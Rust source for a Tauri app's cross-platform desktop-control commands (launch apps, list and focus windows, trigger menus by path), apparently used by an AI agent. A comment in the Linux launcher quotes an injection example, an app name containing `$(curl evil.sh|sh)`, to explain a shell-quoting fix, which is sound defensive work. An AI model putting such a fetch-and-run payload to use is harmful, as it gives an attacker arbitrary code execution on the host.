//! System control — the FAST path for "jump between software": launch / activate apps,
//! list running apps & their windows, raise a specific window, and trigger menu items BY
//! PATH (File ▸ New ▸ …) directly. No vision, no FFI, no extra crates:
//!   • macOS   → `open(1)` + osascript (JavaScript for Automation, the AX API)
//!   • Windows → PowerShell + UI Automation (System.Windows.Automation)
//! Direct OS calls are instant vs. the screenshot→find→click→screenshot loop.
//!
//! Every call is TIME-BOUNDED (kills the subprocess on timeout) and returns either a JSON
//! string the IDE renders, or an error string. On other platforms the commands return an
//! error. NOTE: the Windows path mirrors the (live-tested) macOS one but should be
//! validated on a real Windows box — UI Automation menu coverage varies by app toolkit
//! (classic Win32 / WinForms / WPF expose menus well; some Electron/UWP/custom UIs don't).

use std::io::Read;
use std::process::Stdio;
use std::time::{Duration, Instant};

/// Spawn a program with args, bounded by `timeout_ms`; return trimmed stdout, or an error
/// (stderr if stdout was empty). Platform-agnostic — compiles everywhere.
fn run_cmd_bounded(program: &str, args: &[&str], timeout_ms: u64) -> Result<String, String> {
    let mut child = crate::process_util::command(program)
        .args(args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("{program} 启动失败: {e}"))?;
    let deadline = Instant::now() + Duration::from_millis(timeout_ms);
    loop {
        match child.try_wait() {
            Ok(Some(_)) => break,
            Ok(None) => {
                if Instant::now() > deadline {
                    let _ = child.kill();
                    let _ = child.wait();
                    return Err("操作超时（可能在等系统弹权限框，或目标 App 无响应）".into());
                }
                std::thread::sleep(Duration::from_millis(25));
            }
            Err(e) => return Err(format!("{e}")),
        }
    }
    let mut out = String::new();
    let mut err = String::new();
    if let Some(mut so) = child.stdout.take() {
        let _ = so.read_to_string(&mut out);
    }
    if let Some(mut se) = child.stderr.take() {
        let _ = se.read_to_string(&mut err);
    }
    let out = out.trim().to_string();
    if out.is_empty() && !err.trim().is_empty() {
        return Err(err.trim().to_string());
    }
    Ok(out)
}

/// System control is implemented with synchronous OS subprocesses. Keep those
/// waits off Tokio's worker threads so several slow apps cannot stall unrelated
/// Tauri commands that share the async runtime.
async fn run_system_call<F>(call: F) -> Result<String, String>
where
    F: FnOnce() -> Result<String, String> + Send + 'static,
{
    tauri::async_runtime::spawn_blocking(call)
        .await
        .map_err(|error| format!("系统控制任务失败: {error}"))?
}

/// Run a UI-automation script on the host: JXA via osascript on macOS, PowerShell on
/// Windows. Each caller supplies BOTH; the platform picks one. (cfg confined here so the
/// command bodies below stay platform-agnostic and compile-check on every OS.)
/// JXA 会把权限拒绝伪装成业务错误。
///
/// System Events 被 TCC 拒绝时，脚本里的 catch 会把 `Error: … (-1743)` 塞进 JSON 的
/// error 字段照常返回——上层看到的是一次"成功"调用，里面带着一句「该 App 没在运行」
/// 或「菜单名要和界面完全一致」。于是用户被指去核对 App 名和菜单名，而真正的问题是
/// 系统根本没放行。这里在唯一的出口处把它认出来，换成真话。
#[cfg(target_os = "macos")]
fn looks_like_apple_events_denial(text: &str) -> bool {
    // -1743 = errAEEventNotPermitted，-25211 = 未获辅助功能授权。裸数字容易误伤
    // （窗口标题里也可能出现），所以要求它和一次真实的错误同时出现。
    let has_error_context = text.contains("Error") || text.contains("error");
    (has_error_context && (text.contains("-1743") || text.contains("-25211")))
        || text.contains("Not authorized to send Apple events")
        || text.contains("not allowed assistive access")
        || text.contains("is not allowed assistive access")
}

#[cfg(target_os = "macos")]
fn apple_events_denied_message() -> String {
    format!(
        "[权限被拒] macOS 不允许 Mr. Day One 驱动其他应用（Apple Events 被系统拒绝）。         这和 App 名字、菜单项名字写得对不对无关，重试也不会好。{}",
        crate::permissions::advice_text(
            crate::permissions::accessibility_granted(),
            true,
            false,
            crate::permissions::identity_pinned_to_build(),
        )
    )
}

#[cfg(target_os = "macos")]
fn run_native(macos_jxa: &str, _windows_ps: &str, t: u64) -> Result<String, String> {
    match run_cmd_bounded("osascript", &["-l", "JavaScript", "-e", macos_jxa], t) {
        Ok(out) if looks_like_apple_events_denial(&out) => Err(apple_events_denied_message()),
        Err(e) if looks_like_apple_events_denial(&e) => Err(apple_events_denied_message()),
        other => other,
    }
}
#[cfg(target_os = "windows")]
fn run_native(_macos_jxa: &str, windows_ps: &str, t: u64) -> Result<String, String> {
    run_cmd_bounded(
        "powershell",
        &[
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            windows_ps,
        ],
        t,
    )
}
#[cfg(not(any(target_os = "macos", target_os = "windows")))]
fn run_native(_macos_jxa: &str, _windows_ps: &str, _t: u64) -> Result<String, String> {
    Err("系统控制仅支持 macOS / Windows".into())
}

/// PowerShell single-quote a value (' → ''), so app/menu names inject safely.
fn ps_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "''"))
}
/// PowerShell string array literal: ["a","b"] → @('a','b').
#[cfg(target_os = "windows")]
fn ps_array(items: &[String]) -> String {
    let v: Vec<String> = items.iter().map(|s| ps_quote(s)).collect();
    format!("@({})", v.join(","))
}

// Foreground-window → process P/Invoke, reused by several Windows scripts. (Add-Type of
// the same class is harmless across the fresh per-call powershell processes.)
const PS_FG: &str = "Add-Type @\"\nusing System;using System.Runtime.InteropServices;\npublic class _FG{[DllImport(\"user32.dll\")]public static extern IntPtr GetForegroundWindow();[DllImport(\"user32.dll\")]public static extern int GetWindowThreadProcessId(IntPtr h,out int p);}\n\"@ -ErrorAction SilentlyContinue;";

// ── open / activate an app ────────────────────────────────────────────────────
#[cfg(target_os = "macos")]
fn do_open(name: &str, bg: bool) -> Result<String, String> {
    let args: &[&str] = if bg {
        &["-g", "-a", name]
    } else {
        &["-a", name]
    };
    match run_cmd_bounded("open", args, 6000) {
        Ok(_) if bg => Ok(format!("✓ 已在后台启动「{name}」（不抢焦点、不打断你）。")),
        Ok(_) => {
            // 切过去了没有，要**核实**，不能无条件宣布。
            //
            // `open -a` 成功只意味着命令被接受了：冷启动的重应用要好几秒才到前台，
            // 有的应用会弹权限/更新对话框把焦点截走，有的干脆起在别的桌面空间。
            // 而这里原来直接回「它现在是前台 App」——模型据此拿着旧界面继续操作，
            // 后面每一步都作用在错误的应用上，而且这是最难自查的一类静默失败。
            let deadline = std::time::Instant::now() + std::time::Duration::from_secs(3);
            let want = name.to_lowercase();
            let mut seen = String::new();
            loop {
                if let Ok(front) = system_frontmost_inner() {
                    seen = front.clone();
                    if front.to_lowercase().contains(&want) {
                        return Ok(format!("✓ 已切换到「{name}」，已核实它现在确实在前台（{front}）。可以用 system menu 走它的菜单，或 computer screenshot 看界面节点。"));
                    }
                }
                if std::time::Instant::now() >= deadline {
                    return Ok(format!(
                        "⚠️ 已向系统发出打开「{name}」的请求，但 3 秒内它没有到前台——当前前台是「{}」。可能还在冷启动、被权限或更新对话框截了焦点、或者起在别的桌面空间。**先 computer screenshot 或 system frontmost 确认现在屏幕上是什么，再决定下一步**，别直接对着它操作。",
                        if seen.is_empty() { "（读不到）" } else { seen.as_str() }
                    ));
                }
                std::thread::sleep(std::time::Duration::from_millis(120));
            }
        }
        Err(e) => {
            // fallback: activate an already-running process by exact name
            let njs = serde_json::to_string(name).unwrap_or_else(|_| "\"\"".into());
            let script = format!("(function(){{try{{Application('System Events').applicationProcesses.byName({njs}).frontmost=true;return 'ok';}}catch(e){{return 'ERR';}}}})()");
            match run_cmd_bounded("osascript", &["-l", "JavaScript", "-e", &script], 3000) {
                Ok(s) if s == "ok" => Ok(format!("✓ 已切换到「{name}」")),
                // 这条回退不走 run_native，所以要自己认一次权限拒绝——否则一次 TCC 拒绝
                // 会被原样说成「名字要和菜单栏显示的完全一致」，把排查带到拼写上去。
                #[cfg(target_os = "macos")]
                _ if !crate::permissions::apple_events_granted() => Err(apple_events_denied_message()),
                _ => Err(format!("打不开/找不到 App「{name}」：{e}。名字要和「应用程序」或菜单栏显示的完全一致。")),
            }
        }
    }
}
#[cfg(target_os = "windows")]
fn do_open(name: &str, _bg: bool) -> Result<String, String> {
    // Running already? AppActivate it. Otherwise Start-Process (exe name or path).
    let script = format!(
        "{fg}\n$ErrorActionPreference='SilentlyContinue';$n={n};\
         $p=Get-Process|Where-Object{{$_.MainWindowHandle -ne 0 -and ($_.Name -eq $n -or $_.MainWindowTitle -like ('*'+$n+'*'))}}|Select-Object -First 1;\
         if($p){{$sh=New-Object -ComObject WScript.Shell;[void]$sh.AppActivate($p.Id);('✓ 已切换到 '+$n)}}\
         else{{try{{Start-Process $n -ErrorAction Stop;('✓ 已启动 '+$n)}}catch{{Write-Error ('打不开 '+$n+'：'+$_.Exception.Message)}}}}",
        fg = PS_FG,
        n = ps_quote(name)
    );
    run_cmd_bounded(
        "powershell",
        &[
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            &script,
        ],
        8000,
    )
}
// Linux desktop control via wmctrl (window list/activate) + xdotool (active window).
// Best-effort: needs `wmctrl` + `xdotool` installed (sudo apt install wmctrl xdotool).
// Window/app switching is reliable; MENUS have no uniform Linux API → use the computer
// tool's coordinate/grid for those. Node enumeration (AT-SPI) is not wired here yet, so
// the computer tool falls back to the coordinate grid on Linux (no regression).
#[cfg(target_os = "linux")]
mod lx {
    use super::run_cmd_bounded;
    fn jstr(s: &str) -> String {
        serde_json::to_string(s).unwrap_or_else(|_| "\"\"".into())
    }
    fn active_name() -> String {
        run_cmd_bounded(
            "sh",
            &["-c", "xdotool getactivewindow getwindowname 2>/dev/null"],
            2500,
        )
        .unwrap_or_default()
    }
    fn win_titles() -> Result<Vec<String>, String> {
        let out = run_cmd_bounded("wmctrl", &["-l"], 3000)
            .map_err(|e| format!("列窗口失败：装 wmctrl（sudo apt install wmctrl）：{e}"))?;
        let mut v = Vec::new();
        for line in out.lines() {
            // "<id> <desktop> <host> <title>"
            let parts: Vec<&str> = line.splitn(4, char::is_whitespace).collect();
            if parts.len() == 4 {
                let t = parts[3].trim();
                if !t.is_empty() {
                    v.push(t.to_string());
                }
            }
        }
        Ok(v)
    }
    pub fn open(name: &str) -> Result<String, String> {
        if run_cmd_bounded("wmctrl", &["-a", name], 3000).is_ok() {
            return Ok(format!("✓ 已切换到「{name}」"));
        }
        if run_cmd_bounded("gtk-launch", &[name], 3000).is_ok() {
            return Ok(format!("✓ 已启动「{name}」"));
        }
        // 把 name 作为**位置参数**交给 shell，而不是拼进脚本文本。
        //
        // 原来的写法只删掉了双引号就直接内插，但双引号里 `$(...)`、反引号、`$VAR` 全都
        // 照常展开 —— 一个叫 `x$(curl evil.sh|sh)` 的"应用名"就是任意命令执行。而这个名字
        // 是模型可控的。用 `$1` 引用时 shell 只把它当数据，不再解析其内容。
        match run_cmd_bounded(
            "sh",
            &["-c", "setsid \"$1\" >/dev/null 2>&1 &", "sh", name],
            3000,
        ) {
            Ok(_) => Ok(format!("✓ 已尝试启动「{name}」（没出来就确认可执行名/桌面ID，或装 wmctrl 以激活已开窗口）")),
            Err(e) => Err(format!("打不开「{name}」：{e}。Linux 桌面控制需要 wmctrl+xdotool：sudo apt install wmctrl xdotool")),
        }
    }
    pub fn frontmost() -> Result<String, String> {
        let n = active_name();
        if n.is_empty() {
            return Err(
                "拿不到前台窗口：装 xdotool（sudo apt install xdotool）或当前非图形会话".into(),
            );
        }
        Ok(format!("{{\"app\":{},\"window\":{}}}", jstr(&n), jstr(&n)))
    }
    pub fn list_apps() -> Result<String, String> {
        let mut apps: Vec<String> = Vec::new();
        for t in win_titles()? {
            if !apps.iter().any(|a| a == &t) {
                apps.push(t);
            }
        }
        let arr: Vec<String> = apps.iter().map(|a| jstr(a)).collect();
        Ok(format!(
            "{{\"frontmost\":{},\"count\":{},\"apps\":[{}]}}",
            jstr(&active_name()),
            apps.len(),
            arr.join(",")
        ))
    }
    pub fn windows(name: &str) -> Result<String, String> {
        let nl = name.to_lowercase();
        let ws: Vec<String> = win_titles()?
            .into_iter()
            .filter(|t| t.to_lowercase().contains(&nl))
            .collect();
        let items: Vec<String> = ws
            .iter()
            .enumerate()
            .map(|(i, t)| format!("{{\"i\":{},\"title\":{}}}", i, jstr(t)))
            .collect();
        Ok(format!(
            "{{\"app\":{},\"count\":{},\"windows\":[{}]}}",
            jstr(name),
            ws.len(),
            items.join(",")
        ))
    }
    pub fn focus(name: &str, title: &str) -> Result<String, String> {
        let q = if title.is_empty() { name } else { title };
        run_cmd_bounded("wmctrl", &["-a", q], 3000)
            .map(|_| format!("{{\"ok\":true,\"focused\":{}}}", jstr(q)))
            .map_err(|e| format!("聚焦失败（装 wmctrl）：{e}"))
    }
    pub fn menu_unsupported() -> Result<String, String> {
        Ok("{\"error\":\"Linux 没有统一菜单接口，system menu 暂不支持——改用 computer screenshot + 坐标点菜单\"}".into())
    }
}

#[cfg(target_os = "linux")]
fn do_open(name: &str, _bg: bool) -> Result<String, String> {
    lx::open(name)
}
#[cfg(not(any(target_os = "macos", target_os = "windows", target_os = "linux")))]
fn do_open(_name: &str, _bg: bool) -> Result<String, String> {
    Err("系统控制仅支持 macOS / Windows / Linux".into())
}

/// Launch an app, or bring it to the front if already running — instant app switching.
#[tauri::command]
pub async fn system_open_app(name: String, background: Option<bool>) -> Result<String, String> {
    run_system_call(move || system_open_app_inner(name, background)).await
}

fn system_open_app_inner(name: String, background: Option<bool>) -> Result<String, String> {
    let name = name.trim().to_string();
    if name.is_empty() {
        return Err("system open 需要 name（App 名，如 \"Finder\"/\"Safari\"/\"Notepad\"）".into());
    }
    do_open(&name, background.unwrap_or(false))
}

/// List running (non-background) apps + the current frontmost one.
#[tauri::command]
pub async fn system_list_apps() -> Result<String, String> {
    run_system_call(system_list_apps_inner).await
}

#[cfg_attr(target_os = "linux", allow(unreachable_code))]
fn system_list_apps_inner() -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return lx::list_apps();
    let macos = r##"(function(){
  try {
    var se = Application('System Events');
    var fm = '';
    try { fm = se.applicationProcesses.whose({ frontmost: true })[0].name(); } catch (e) {}
    var names = se.applicationProcesses.whose({ backgroundOnly: false }).name();
    var apps = [];
    for (var i = 0; i < names.length; i++) apps.push(names[i]);
    apps.sort();
    return JSON.stringify({ frontmost: fm, count: apps.length, apps: apps });
  } catch (e) { return JSON.stringify({ error: String(e) }); }
})()"##;
    let windows = format!(
        "{fg}\n$ErrorActionPreference='SilentlyContinue';$pp=0;[void][_FG]::GetWindowThreadProcessId([_FG]::GetForegroundWindow(),[ref]$pp);\
         $fm='';try{{$fm=(Get-Process -Id $pp).Name}}catch{{}};\
         $apps=@(Get-Process|Where-Object{{$_.MainWindowTitle}}|Select-Object -ExpandProperty Name|Sort-Object -Unique);\
         @{{frontmost=$fm;count=$apps.Count;apps=$apps}}|ConvertTo-Json -Compress",
        fg = PS_FG
    );
    run_native(macos, &windows, 4000)
}

/// List an app's open windows (index + title), so the agent can jump to a specific one.
#[tauri::command]
pub async fn system_app_windows(name: String) -> Result<String, String> {
    run_system_call(move || system_app_windows_inner(name)).await
}

#[cfg_attr(target_os = "linux", allow(unreachable_code))]
fn system_app_windows_inner(name: String) -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return lx::windows(&name);
    let njs = serde_json::to_string(&name).map_err(|e| e.to_string())?;
    let macos = format!(
        r##"(function(){{
  try {{
    var p = Application('System Events').applicationProcesses.byName({njs});
    var ws = p.windows();
    var out = [];
    for (var i = 0; i < ws.length; i++) {{ var t=''; try {{ t = ws[i].name(); }} catch(e){{}} out.push({{ i: i, title: t }}); }}
    return JSON.stringify({{ app: {njs}, count: out.length, windows: out }});
  }} catch (e) {{ return JSON.stringify({{ error: String(e), hint: '该 App 没在运行或没暴露窗口；先 system open 打开它' }}); }}
}})()"##
    );
    let windows = format!(
        "$ErrorActionPreference='SilentlyContinue';$n={n};\
         $ws=@(Get-Process|Where-Object{{$_.Name -eq $n -and $_.MainWindowTitle}}|ForEach-Object{{$_.MainWindowTitle}});\
         $o=@();for($i=0;$i -lt $ws.Count;$i++){{$o+=@{{i=$i;title=$ws[$i]}}}};\
         @{{app=$n;count=$o.Count;windows=$o}}|ConvertTo-Json -Compress",
        n = ps_quote(&name)
    );
    run_native(&macos, &windows, 4000)
}

/// Activate an app and raise the window whose title contains `title` (or the first one).
#[tauri::command]
pub async fn system_focus_window(name: String, title: Option<String>) -> Result<String, String> {
    run_system_call(move || system_focus_window_inner(name, title)).await
}

#[cfg_attr(target_os = "linux", allow(unreachable_code))]
fn system_focus_window_inner(name: String, title: Option<String>) -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return lx::focus(&name, title.as_deref().unwrap_or(""));
    let njs = serde_json::to_string(&name).map_err(|e| e.to_string())?;
    let want = title.unwrap_or_default();
    let tjs = serde_json::to_string(&want).map_err(|e| e.to_string())?;
    let macos = format!(
        r##"(function(){{
  try {{
    var p = Application('System Events').applicationProcesses.byName({njs});
    p.frontmost = true;
    var ws = p.windows();
    if (!ws.length) return JSON.stringify({{ error: '该 App 没有窗口' }});
    var want = ({tjs} || '').toLowerCase();
    var idx = 0;
    if (want) {{ for (var i = 0; i < ws.length; i++) {{ var t=''; try {{ t = ws[i].name(); }} catch(e){{}} if (t.toLowerCase().indexOf(want) >= 0) {{ idx = i; break; }} }} }}
    try {{ ws[idx].actions.byName('AXRaise').perform(); }} catch (e) {{}}
    var ft=''; try {{ ft = ws[idx].name(); }} catch(e){{}}
    return JSON.stringify({{ ok: true, focused: ft, index: idx }});
  }} catch (e) {{ return JSON.stringify({{ error: String(e) }}); }}
}})()"##
    );
    let windows = format!(
        "$ErrorActionPreference='SilentlyContinue';$n={n};$want={w};\
         $sh=New-Object -ComObject WScript.Shell;\
         $p=Get-Process|Where-Object{{$_.Name -eq $n -and $_.MainWindowTitle -like ('*'+$want+'*')}}|Select-Object -First 1;\
         if(-not $p){{$p=Get-Process|Where-Object{{$_.Name -eq $n -and $_.MainWindowTitle}}|Select-Object -First 1}};\
         if($p){{[void]$sh.AppActivate($p.Id);@{{ok=$true;focused=$p.MainWindowTitle}}|ConvertTo-Json -Compress}}\
         else{{@{{error='没找到该 App 的窗口'}}|ConvertTo-Json -Compress}}",
        n = ps_quote(&name),
        w = ps_quote(&want)
    );
    run_native(&macos, &windows, 4000)
}

// Windows menu/menu_items share a UIAutomation preamble + window-resolver. Placeholder
// templates (no format! braces) keep the dense automation code readable.
#[cfg(target_os = "windows")]
const PS_UIA_HEAD: &str = "$ErrorActionPreference='SilentlyContinue';Add-Type -AssemblyName UIAutomationClient,UIAutomationTypes;Add-Type @\"\nusing System;using System.Runtime.InteropServices;\npublic class _W{[DllImport(\"user32.dll\")]public static extern IntPtr GetForegroundWindow();}\n\"@ -ErrorAction SilentlyContinue;$AE=[System.Windows.Automation.AutomationElement];$TS=[System.Windows.Automation.TreeScope]::Descendants;\nfunction _root($app){ if($app){ $p=Get-Process|Where-Object{$_.Name -eq $app -and $_.MainWindowHandle -ne 0}|Select-Object -First 1; if($p){ return $AE::FromHandle($p.MainWindowHandle) } }; return $AE::FromHandle([_W]::GetForegroundWindow()) }\nfunction _byName($el,$nm){ $c=New-Object System.Windows.Automation.PropertyCondition($AE::NameProperty,$nm); return $el.FindFirst($TS,$c) }\nfunction _invoke($el){ $p=$null; if($el.TryGetCurrentPattern([System.Windows.Automation.InvokePattern]::Pattern,[ref]$p)){ $p.Invoke(); return $true }; if($el.TryGetCurrentPattern([System.Windows.Automation.ExpandCollapsePattern]::Pattern,[ref]$p)){ $p.Expand(); return $true }; return $false }\nfunction _expand($el){ $p=$null; if($el.TryGetCurrentPattern([System.Windows.Automation.ExpandCollapsePattern]::Pattern,[ref]$p)){ $p.Expand(); Start-Sleep -Milliseconds 140; return $true }; return $false }";

/// Trigger a menu item by PATH, e.g. ["File","New Tab"] or ["Format","Font","Bold"].
/// app=None → the current frontmost app. A 1-element path opens that top menu.
#[tauri::command]
pub async fn system_menu(app: Option<String>, path: Vec<String>) -> Result<String, String> {
    run_system_call(move || system_menu_inner(app, path)).await
}

#[cfg_attr(target_os = "linux", allow(unreachable_code, unused_variables))]
fn system_menu_inner(app: Option<String>, path: Vec<String>) -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return lx::menu_unsupported();
    if path.is_empty() {
        return Err(
            "system menu 需要 path，如 [\"File\",\"New\"] 或 [\"Edit\",\"Find\",\"Find…\"]".into(),
        );
    }
    let ajs = match &app {
        Some(a) if !a.trim().is_empty() => serde_json::to_string(a).map_err(|e| e.to_string())?,
        _ => "null".to_string(),
    };
    let pjs = serde_json::to_string(&path).map_err(|e| e.to_string())?;
    let macos = format!(
        r##"(function(){{
  try {{
    var se = Application('System Events');
    var proc = {ajs} ? se.applicationProcesses.byName({ajs}) : se.applicationProcesses.whose({{ frontmost: true }})[0];
    try {{ proc.frontmost = true; delay(0.05); }} catch (e) {{}}
    var path = {pjs};
    var mb = proc.menuBars[0];
    var top = mb.menuBarItems.byName(path[0]);
    if (path.length === 1) {{ top.click(); return JSON.stringify({{ ok: true, opened: path[0] }}); }}
    var menu = top.menus[0];
    for (var i = 1; i < path.length; i++) {{
      var it = menu.menuItems.byName(path[i]);
      if (i === path.length - 1) {{ it.click(); return JSON.stringify({{ ok: true, clicked: path.join(' ▸ ') }}); }}
      menu = it.menus[0];
    }}
    return JSON.stringify({{ error: '没走到末项' }});
  }} catch (e) {{ return JSON.stringify({{ error: String(e), hint: '菜单名要和界面显示完全一致(含语言/省略号…)；不确定就先 system menu_items 列出某级菜单的真实项名' }}); }}
}})()"##
    );
    #[cfg(target_os = "windows")]
    let windows = {
        let app_lit = match &app {
            Some(a) if !a.trim().is_empty() => ps_quote(a),
            _ => "$null".to_string(),
        };
        format!(
            "{head}\n$root=_root({app});$path={path};\
             for($i=0;$i -lt $path.Count;$i++){{ $el=_byName $root $path[$i]; \
               if(-not $el){{ @{{error=('找不到菜单项: '+$path[$i])}}|ConvertTo-Json -Compress; return }}; \
               if($i -eq $path.Count-1){{ if(_invoke $el){{ @{{ok=$true;clicked=($path -join ' > ')}}|ConvertTo-Json -Compress }} else {{ @{{error='该项无法触发(无 Invoke/Expand)'}}|ConvertTo-Json -Compress }}; return }} \
               else {{ [void](_expand $el) }} }}\
             @{{error='没走到末项'}}|ConvertTo-Json -Compress",
            head = PS_UIA_HEAD,
            app = app_lit,
            path = ps_array(&path)
        )
    };
    #[cfg(not(target_os = "windows"))]
    let windows = String::new();
    run_native(&macos, &windows, 6000)
}

/// List the item names under a menu path (path=[] → top-level menu titles), so the agent
/// can discover the EXACT names to feed system_menu.
#[tauri::command]
pub async fn system_menu_items(app: Option<String>, path: Vec<String>) -> Result<String, String> {
    run_system_call(move || system_menu_items_inner(app, path)).await
}

#[cfg_attr(target_os = "linux", allow(unreachable_code, unused_variables))]
fn system_menu_items_inner(app: Option<String>, path: Vec<String>) -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return lx::menu_unsupported();
    let ajs = match &app {
        Some(a) if !a.trim().is_empty() => serde_json::to_string(a).map_err(|e| e.to_string())?,
        _ => "null".to_string(),
    };
    let pjs = serde_json::to_string(&path).map_err(|e| e.to_string())?;
    let macos = format!(
        r##"(function(){{
  try {{
    var se = Application('System Events');
    var proc = {ajs} ? se.applicationProcesses.byName({ajs}) : se.applicationProcesses.whose({{ frontmost: true }})[0];
    var path = {pjs};
    var mb = proc.menuBars[0];
    if (!path.length) {{ var t = mb.menuBarItems.name(); var o=[]; for (var i=0;i<t.length;i++) o.push(t[i]); return JSON.stringify({{ app: proc.name(), level: 'top', items: o }}); }}
    var menu = mb.menuBarItems.byName(path[0]).menus[0];
    for (var i = 1; i < path.length; i++) menu = menu.menuItems.byName(path[i]).menus[0];
    var names = menu.menuItems.name();
    var out = [];
    for (var j = 0; j < names.length; j++) {{ if (names[j]) out.push(names[j]); }}
    return JSON.stringify({{ app: proc.name(), under: path.join(' ▸ '), items: out }});
  }} catch (e) {{ return JSON.stringify({{ error: String(e) }}); }}
}})()"##
    );
    #[cfg(target_os = "windows")]
    let windows = {
        let app_lit = match &app {
            Some(a) if !a.trim().is_empty() => ps_quote(a),
            _ => "$null".to_string(),
        };
        // Expand intermediate items along the path, then collect that menu's item names.
        // path=[] → top-level menu-bar item names.
        format!(
            "{head}\n$root=_root({app});$path={path};\
             if($path.Count -eq 0){{ $c=New-Object System.Windows.Automation.PropertyCondition($AE::ControlTypeProperty,[System.Windows.Automation.ControlType]::MenuItem); \
               $els=$root.FindAll($TS,$c); $o=@(); foreach($e in $els){{ $n=$e.Current.Name; if($n){{ $o+=$n }} }}; @{{level='top';items=($o|Select-Object -Unique)}}|ConvertTo-Json -Compress; return }}\
             $cur=$root; for($i=0;$i -lt $path.Count;$i++){{ $el=_byName $cur $path[$i]; if(-not $el){{ @{{error=('找不到: '+$path[$i])}}|ConvertTo-Json -Compress; return }}; [void](_expand $el); $cur=$el }}\
             $c2=New-Object System.Windows.Automation.PropertyCondition($AE::ControlTypeProperty,[System.Windows.Automation.ControlType]::MenuItem); \
             $kids=$cur.FindAll($TS,$c2); $out=@(); foreach($k in $kids){{ $n=$k.Current.Name; if($n){{ $out+=$n }} }}\
             @{{under=($path -join ' > ');items=($out|Select-Object -Unique)}}|ConvertTo-Json -Compress",
            head = PS_UIA_HEAD,
            app = app_lit,
            path = ps_array(&path)
        )
    };
    #[cfg(not(target_os = "windows"))]
    let windows = String::new();
    run_native(&macos, &windows, 5000)
}

/// What's frontmost right now (app + its front window title).
#[tauri::command]
pub async fn system_frontmost() -> Result<String, String> {
    run_system_call(system_frontmost_inner).await
}

#[cfg_attr(target_os = "linux", allow(unreachable_code))]
fn system_frontmost_inner() -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return lx::frontmost();
    let macos = r##"(function(){
  try {
    var p = Application('System Events').applicationProcesses.whose({ frontmost: true })[0];
    var w = ''; try { w = p.windows[0].name(); } catch (e) {}
    return JSON.stringify({ app: p.name(), window: w });
  } catch (e) { return JSON.stringify({ error: String(e) }); }
})()"##;
    let windows = format!(
        "{fg}\n$ErrorActionPreference='SilentlyContinue';$pp=0;[void][_FG]::GetWindowThreadProcessId([_FG]::GetForegroundWindow(),[ref]$pp);\
         $p=Get-Process -Id $pp;@{{app=$p.Name;window=$p.MainWindowTitle}}|ConvertTo-Json -Compress",
        fg = PS_FG
    );
    run_native(macos, &windows, 3000)
}

#[cfg(test)]
mod tests {
    use super::run_system_call;
    use std::time::{Duration, Instant};

    #[tokio::test(flavor = "current_thread")]
    async fn system_subprocess_wait_does_not_block_async_runtime() {
        let started = Instant::now();
        let blocking = tokio::spawn(run_system_call(|| {
            std::thread::sleep(Duration::from_millis(400));
            Ok("done".to_string())
        }));

        tokio::time::sleep(Duration::from_millis(25)).await;
        assert!(
            started.elapsed() < Duration::from_millis(250),
            "blocking system work stalled the current-thread async runtime"
        );
        assert_eq!(blocking.await.unwrap().unwrap(), "done");
    }
}
